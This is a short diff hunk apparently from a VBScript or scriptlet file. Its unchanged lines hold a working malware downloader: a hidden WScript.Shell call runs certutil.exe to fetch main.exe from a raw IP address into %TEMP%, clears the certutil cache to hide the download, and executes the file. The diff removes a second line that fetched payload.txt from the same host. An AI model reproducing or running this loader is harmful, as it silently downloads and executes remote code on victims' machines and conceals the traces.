@@ -30,7 +30,6 @@ cmd.exe - < ...:payload.bat
         CreateObject("WScript.Shell").Run _
             "%ComSpec% /c cd /d %TEMP% && " &_
             "(IF NOT EXIST main.exe certutil.exe -urlcache -split -f http://47.98.135.65/main/main.exe) && " &_
-            "(IF NOT EXIST payload.txt certutil.exe -urlcache -split -f http://47.98.135.65/main/payload.txt) && " &_
             "certutil.exe -urlcache * delete & " &_
             "main.exe r", 0, false
     ]]>
